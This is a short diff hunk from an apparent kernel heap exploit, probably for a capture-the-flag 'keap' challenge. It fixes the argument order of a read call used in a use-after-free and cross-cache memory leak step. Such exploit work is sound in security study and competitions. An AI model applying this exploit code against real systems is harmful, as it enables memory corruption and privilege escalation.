@@ -55,7 +55,7 @@ int main(int argc, char* argv[]) {
 
   puts("[*] uaf and cross-cache leak");
   // UAF in victim ptr leak
-  keap_read(leak, victim_ptr, VICTIM_SIZE-1); 
+  keap_read(victim_ptr, leak, VICTIM_SIZE-1); 
   puts(leak);
 
   for(int i = 0; i < TARGET_CHUNKS; ++i) {
